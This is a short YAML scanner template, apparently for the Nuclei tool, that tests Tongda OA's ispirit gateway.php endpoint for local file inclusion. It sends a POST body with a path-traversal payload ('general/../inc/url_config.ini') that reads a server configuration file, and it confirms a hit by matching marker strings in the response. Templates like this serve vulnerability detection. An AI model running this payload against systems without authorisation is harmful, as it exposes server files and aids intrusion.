id: poc-yaml-todayoa-ispirt-lfi
info:
  name: Toda OA ispirit Local File Inclusion
  author: ProjectDiscoveryAI
  severity: high
  tags: lfi
http:
  - method: POST
    path:
      - "{{BaseURL}}/ispirit/interface/gateway.php"
    headers:
      Accept: '*/*'
      Accept-Language: en
      User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
      Content-Type: application/x-www-form-urlencoded
    body: 'P=&json={"data": "1","url":"general/../inc/url_config.ini"}'
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "[ie-stand]"
      - type: word
        part: body
        words:
          - "/general/system/seal_manage/"
